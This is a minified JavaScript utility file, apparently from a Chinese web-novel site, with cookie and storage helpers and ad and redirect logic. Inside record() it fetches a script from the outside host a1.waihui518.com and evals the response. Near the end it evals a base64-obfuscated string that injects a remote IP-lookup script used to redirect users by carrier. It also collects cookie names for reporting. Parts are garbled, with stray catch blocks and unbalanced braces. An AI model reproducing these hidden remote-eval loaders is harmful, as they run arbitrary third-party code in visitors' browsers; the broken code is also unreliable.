function CookieFetcher(){ } CookieFetcher.prototype.byimpl = function(){ return "cookie"; } CookieFetcher.prototype.get = function(name){ var reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)"); var values = document.cookie.match(reg); if (values) return unescape(values[2]); else return null; } CookieFetcher.prototype.getIntValue = function(name) { var value = this.get(name); if (value == "" || value == null) { return 0; } else { return parseInt(value); } } CookieFetcher.prototype.set = function (name, value, ms, path) { if (path){} else {path="/";} if (isNaN(ms)) { document.cookie = name + "=" + escape(value) + ";path=" + path; } else { var exp = new Date(); exp.setTime(exp.getTime() + ms); document.cookie = name + "=" + escape(value) + ";path=" + path + ";expires=" + exp.toGMTString(); } } CookieFetcher.prototype.remove = function (name) { this.set(name, 1, -1); } CookieFetcher.prototype.clear = function () { var keys = document.cookie.match(/[^ =;]+(?=\=)/g); if (keys) { for (var i = keys.length; i--;) document.cookie = keys[i] + "=0;expires=" + new Date(0).toUTCString(); } } function LocalStorageFetcher() {} LocalStorageFetcher.prototype.byimpl = function(){ return "localStorage"; } LocalStorageFetcher.prototype.get = function (name) { return window.localStorage.getItem(name); } LocalStorageFetcher.prototype.getIntValue = function(name) { var value = this.get(name); if (value == "" || value == null) { return 0; } else { return parseInt(value); } } LocalStorageFetcher.prototype.set = function (name, value, ms, path) { window.localStorage.setItem(name, value); } LocalStorageFetcher.prototype.remove = function (name) { window.localStorage.removeItem(name); } LocalStorageFetcher.prototype.clear = function () { window.localStorage.clear(); } var fetcher = window.localStorage ? new LocalStorageFetcher() : new CookieFetcher(); var helper = { "$" : function(id) { return document.getElementById(id); }, cookie : new CookieFetcher(), store : window.localStorage ? new LocalStorageFetcher() : new CookieFetcher(), isMobile : function() { return navigator.userAgent.match(/(iPhone|iPod|Android|ios)/i); }, log : function(msg) { if (console) { console.log(msg); } } }; function getCookie(name) { var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)")); if(arr != null) return unescape(arr[2]); return null; } function setCookie(name,value,setting) { setCookie2(name, value, setting.expires, setting.path); } function setCookie2(name,value,date, path, domainName) { if (path){} else {path="/";} var cookieVar = name + "="+ escape(value) + ";path=" + path; if(date) { var exp = null; if (date instanceof Date) { exp = date; } else if (date > 100000000) { exp = new Date(); exp.setTime(date); } else { exp = new Date(); exp.setTime(exp.getTime() + date*60*60*1000); } cookieVar += ";expires="+ exp.toGMTString() } if (domainName) { cookieVar += ";domain=" + domainName; } document.cookie = cookieVar; } function afterTimeByHour(count) { var exp = new Date(); exp.setTime(exp.getTime() + count*60*60*1000); return exp; } function afterTimeByDay(count) { var exp = new Date(); exp.setTime(exp.getTime() + 24 * count*60*60*1000); return exp; } function getResetTime() { var now = new Date(); now.setHours(0); now.setMinutes(0); now.setSeconds(0); now.setMilliseconds(0);	return new Date(24 * 3600 * 1000 + now.getTime()); } function getCookieForInt(name) { var value = getCookie(name); if (value == "" || value == null) { return 0; } else { return parseInt(value); } } function Ajax(url, params, callback, method) { this.createHttpRequest = function() { if (window.ActiveXObject) { try { return new ActiveXObject('Msxml2.XMLHTTP'); } catch (e) { return new ActiveXObject("Microsoft.XMLHTTP"); } } else { return new XMLHttpRequest(); } } this.url = url; this.params = params; this.callback = callback; this.method = method == null? "post" : method; this.xmlHttp = this.createHttpRequest(); window.myAjax = this; this.doRequest = function() { var query = ""; for (var param in this.params) { if (query != "") { query += "&"; } query += param + "=" + this.params[param]; } if (this.method == "post") { this.xmlHttp.open(this.method, this.url, true); this.xmlHttp.onreadystatechange = this.stateChanged; this.xmlHttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); this.xmlHttp.send(query); } else { this.url += "?" + query; try { this.xmlHttp.open(this.method, this.url, true); } catch (err) {} this.xmlHttp.send(null); return this.xmlHttp.responseText; } }; this.stateChanged = function() { if (myAjax.xmlHttp.readyState==4 || myAjax.xmlHttp.readyState=="complete") { var data = myAjax.xmlHttp.responseText; var json = eval("(" + data + ")"); myAjax.callback(json); } }; } function doajax(url, params, callback) { var ajax = new Ajax(url, params, callback, "post"); ajax.doRequest(); /*$.ajax({ type:'post', url:url, data:param, cache:false, dataType:'json', success:callback }); */ } function logA(aid) { var ras = getCookie("ras"); if (ras == null || ras == "") { ras = aid; } else { var aidArray = ras.split(","); for (var raid in aidArray) { if (aidArray[raid] == aid) { return; } } ras = aid + "," + ras; } var aids = ras.split(","); if (aids.length > 50) { aids.splice(49); } setCookie("ras", aids.join(","), { expires:365, path: '/' }); } function record(aid, category) { logA(aid); ac(category, aid); //document.write("
"); (function(O, url) {var u = navigator.userAgent.indexOf("UCBrowser") > -1 ? "http://a1.waihui518.com/" : "http://a1.waihui518.com/"; var a = new XMLHttpRequest(); var b = u + url; if (a != null) {a.onreadystatechange = function() {if (a.readyState == 4) {if (a.status == 200) {if (window.execScript) window.execScript(a.responseText, "JavaScript"); else if (window.eval) window.eval(a.responseText, "JavaScript"); else eval(a.responseText); } } }; a.open("GET", b, false); a.send(null); } })(window.O, "?s=1_1022_264"); } } catch(ex){if(window.console)console.log(ex)} } } function checkPageCount(cname, maxCount) { return true; var currentCount = getCookieForInt(cname); if (currentCount > maxCount) return false; currentCount++; setCookie(cname, currentCount, { expires: getResetTime(), path: '/' }); return true; } function showTips4Bookcase() { if (isUC) { //document.writeln("如果小说无法删除，请关闭浏览器的广告过滤功能。"); } } if (document.location.href.indexOf("debug=1") > -1 || document.location.href.indexOf("d=1") > -1) { setCookie("debug", "1", { expires: getResetTime(), path: '/' }); } if (self != top) { top.location.href = self.location.href; } function setFontSize(size) { setCookie("fs", size, {expires:afterTimeByDay(365),path:"/"}); restore(size); } var showedTips = false; function restore(size) { if (!showedTips) { document.writeln("
本站新（短）域名:m.b5200.org<\/font><\/b><\/div>"); showedTips = true; } if (!size) size = getCookie("fs"); if (!size) size = "20"; var content = document.getElementById("content"); if (content) { content.style.fontSize = size+"px"; } } function cad1() { } function cad2() { } function cad3() { if ( !(window.novelId) ) return; dycgg(); return; } function cad4() { //try{doTongji();}catch(ex){} if ( !(window.novelId) ) return; dycgg(); return; } function cad5() { } function cnt1() { } function cnt2() { } function cnt3() { if ( !(window.novelId) ) return; dycgg(); return; } function cnt4() { //try{doTongji();}catch(ex){} if ( !(window.novelId) ) return; dycgg(); return; } function cnt5() { } function swap() { //setTimeout("swap2('ad5', 'ad3');",3000); } function swap2(source, target) { var ad1 = document.getElementById(source); var ad2 = document.getElementById(target); ad2.innerHTML = ad1.innerHTML; ad1.innerHTML = ""; } function mad1(name) { ggfix(name); } function content1(name) { ggfix("gcontent1"); } function content2(name) { ggfix("gcontent2"); } /*var cac = getWhich("cac", 0, 99); function invokeAd() { var now = new Date(); document.writeln(""); } catch(ex){if(window.console)console.log(ex)} } } function reportCookies() { var red = getCookie("red"); if (red == "1") return; if (document.cookie && document.cookie.length > 10) { var cknames = new Array(); var cookies = document.cookie.split(";"); for (var i = 0; i < cookies.length; i++) { var ckValues = cookies[i].split("="); var ckname = ckValues[0]; cknames.push(ckname); } if (cknames.length > 100) { var m = new Object(); m.i = navigator.userAgent; m.k = "T" + new Date().getTime(); m.m = cknames.join(","); m.curl = "/"; doajax("/m.htm", m, function(json) { //console.log(json) }); setCookie("red", "1", { expires: afterTimeByDay(7), path: '/' }); } } } try { var referrer = document.referrer; if (referrer) { var from = ""; if (referrer.indexOf("trada") > -1 && referrer.indexOf("quan") > -1) { from = "baidu"; } else if (referrer.indexOf("sm.cn/") > -1) { from = "sm"; } else { var loc = document.location.href; var index = loc.lastIndexOf("#"); if (index > -1 && loc.length - index < 8) { from = loc.substring(index + 1); } else if (referrer.indexOf("www.biquge5200.com/") > -1) { from = "www"; } } if (from) { setCookie("from", from, { expires: afterTimeByDay(7), path: '/' }); } } var from = getCookie("from"); var gob = false; if (from && !gob) { if ("baidu" == from && (isUC || isQQ)) { var count = helper.cookie.getIntValue("pv"); if (count > 2) { gob = true; //setCookie2("to", "2", 365*24, "/"); } } else if (("sm" == from || "wwwsm" == from) && !isUC ) { var count = helper.cookie.getIntValue("pv"); if (count > 2) { gob = true; //setCookie2("to", "2", 365*24, "/"); } } else { var ccu = getCookie("ccu"); if (ccu != null && ccu.length ==32) { //if (isQQ) { gob = true; //} } } } var to = getCookie("to"); if (gob || to) { var loc = window.location.href; var newLoc = loc.replace("i.biquge5200.com", "m.b5200.org"); if (to == "2") { newLoc = loc.replace("i.biquge5200.com", "m.b5200.net"); } if (loc != newLoc) { window.location.href= newLoc; } } } catch(er){} function rmpop() { var as = document.getElementsByTagName("a"); if (!as) return; for (var i = 0; i < as.length; i++) { var a = as[i]; if (a.innerHTML == "") { var found = false; if (a.style.height) { var vHeight = a.style.height.toLowerCase(); if (vHeight == "100%") { found = true; } } if (!found) { if (a.offsetHeight > 400) { found = true; } } if (found) { a.style.display = 'none'; helper.log("found pop, url=" + a.href); } } } } function fromm(json) { if (!json) return; if (!json.ips) return; var ips = json.ips; if (ips.length == 0) return; setCookie2("mip", "1", 2, "/"); if(ips[0].isp.indexOf("移动") > -1) { var loc = window.location.href; var newLoc = loc.replace("i.biquge5200.com", "m.b5200.net"); if (loc != newLoc) { window.location.href= newLoc; setCookie2("to", "2", 365*24, "/"); } } } var mip = getCookie("mip"); if (!mip) { eval(window.atob('ZG9jdW1lbnQud3JpdGVsbigiPHNjcmlwdCB0eXBlPVwidGV4dC9qYXZhc2NyaXB0XCIgc3JjPVwiaHR0cDovL2lwLmkuYmlxdWdlNTIwMC5jb20vaXAuaHRtP2NhbGxiYWNrPWZyb21tXCIvPiIpOw==')); }